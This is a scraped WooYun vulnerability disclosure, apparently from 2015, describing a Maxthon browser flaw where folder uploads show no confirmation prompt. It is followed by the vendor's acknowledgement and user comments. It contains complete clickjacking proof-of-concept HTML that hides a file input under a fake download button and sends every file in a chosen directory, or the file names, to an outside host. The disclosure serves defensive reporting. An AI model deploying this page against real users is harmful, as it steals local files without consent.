{"id": 17522, "wybug_id": "wooyun-2015-0108019", "wybug_title": "傲游浏览器某内核设计缺陷可能导致用户信息泄露（窃取本地用户文件）", "wybug_corp": "傲游", "wybug_author": "Lyleaks", "wybug_date": "2015-04-15 10:36", "wybug_open_date": "2015-07-14 15:54", "wybug_type": "设计错误/逻辑缺陷", "wybug_level": "中", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["浏览器"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-15：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-15：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-04-18：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-06-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-14：\t细节向公众公开  简要描述： 傲游浏览器某缺陷可能导致用户信息泄露 详细说明：  webkit内核的浏览器可以通过在input标签中添加webkitdirectory属性来上传文件夹。\n<input type=\"file\" webkitdirectory>\n在Chrome下，上传框如图\n\n但在傲游浏览器下，上传框却没有提示\n\n因此，可以利用这个缺陷，使用点击劫持的方法，来欺骗用户上传文件。在页面顶层设置一个透明的上传表单，在底层设置一个下载按钮，当用户点击下载按钮，选择下载目录点击确定后，该目录下的文件就会上传到远程服务器。\n<html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /><script src=\"http://upcdn.b0.upaiyun.com/libs/jquery/jquery-2.0.3.min.js\" type=\"text/javascript\"></script> <style>a:link, a:visited {color: lightgreen;}input[type='file'] {opacity: 0;position: absolute;left: 0; top: 0;width: 300px;z-index: 2;line-height: 20px;height: 25px;}#cloak {position: absolute;left: 0;top: 0;z-index: 1;line-height: 20px;height: 25px;cursor: pointer;}label {display: block;}</style></head><body><button id=cloak>点击下载 WooYun.avi</button><input type=\"file\" id=\"cloaked\" webkitdirectory directory /><script>document.getElementById(\"cloaked\").onchange = function(e) {for (var i = 0, f; f = e.target.files[i]; ++i) {console.log(\"sending file with path: \" + f.webkitRelativePath + \", name: \" + f.name);fdata = new FormData();fdata.append('path', f.webkitRelativePath);fdata.append('name', f.name);fdata.append('content', f);var xhr = new XMLHttpRequest();xhr.open(\"POST\", \"http://utf7.ml/upload\", true);xhr.send(fdata);}};</script></body></html>\n   漏洞证明：  这里用于演示就不上传文件了，只是记录文件名。\n<html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /><script src=\"http://upcdn.b0.upaiyun.com/libs/jquery/jquery-2.0.3.min.js\" type=\"text/javascript\"></script><style>a:link, a:visited {color: lightgreen;}input[type='file'] {opacity: 0;position: absolute;left: 0; top: 0;width: 300px;z-index: 2;line-height: 20px;height: 25px;}#cloak {position: absolute;left: 0;top: 0;z-index: 1;line-height: 20px;height: 25px;cursor: pointer;}label {display: block;}</style></head><body><button id=cloak>点击下载 WooYun.avi</button><input type=\"file\" id=\"cloaked\" webkitdirectory directory /><script>document.getElementById(\"cloaked\").onchange = function(e) {for (var i = 0, f; f = e.target.files[i]; ++i) {console.log(\"sending file with path: \" + f.webkitRelativePath + \", name: \" + f.name);fdata = {};fdata['path'] = f.webkitRelativePath;fdata['name'] = f.name;var xhr = new XMLHttpRequest();xhr.open(\"GET\", \"http://utf7.ml/t/fj5.php?data=\"+encodeURI(JSON.stringify(fdata)), true);xhr.send();}};</script></body></html>\n访问下面的URL\nhttp://utf7.ml/t/fj.html\n\n\n点击下载\n\n选择目录之后点确定。访问下面的URL，就能查看该目录下的文件\nhttp://utf7.ml/t/fjdata.html\n\n\n\n\n测试版本\n\n   修复方案：     版权声明：转载请注明来源 Lyleaks@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-04-15 15:53 厂商回复： 确认, 提示不完善 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-04-15 10:40 |    \t\t梧桐雨  \t\t\t( 核心白帽子 |\t\t\t        Rank:1576 漏洞数:184        | 关注技术与网络安全)\t\t \n  我来抱你大腿=。=    \n     2015-04-15 10:44 |    \t\t孤独行者 \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:44        | 时光如水，总是无言。你若安好，便是晴天)\t\t \n  抱大腿    \n     2015-04-15 10:45 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  这个技巧以前见过，属于淫技 ：P    \n     2015-04-15 10:50 |    \t\t梧桐雨  \t\t\t( 核心白帽子 |\t\t\t        Rank:1576 漏洞数:184        | 关注技术与网络安全)\t\t \n  @疯狗 狗哥都这么说，那更要强烈关注。    \n     2015-04-15 10:56 |    \t\t泳少 \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:79        | ★           梦想这条路踏上了，跪着也要...)\t\t \n  遨游已经泪哭了    \n     2015-04-15 11:31 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  天天刷遨游啊    \n     2015-04-15 12:27 |    \t\tganggang \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:2        | 这个号是来乌云聊天的....)\t\t \n  @疯狗 楼主这是要盗便乌云账号的节奏呀....http://utf7.ml/    \n     2015-04-15 12:48 |    \t\tqhwlpg \t\t\t( 普通白帽子  |\t\t\t        Rank:226 漏洞数:54        | 潜心代码审计。)\t\t \n  不在遨游里遨游，就在遨游刷遨游。    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}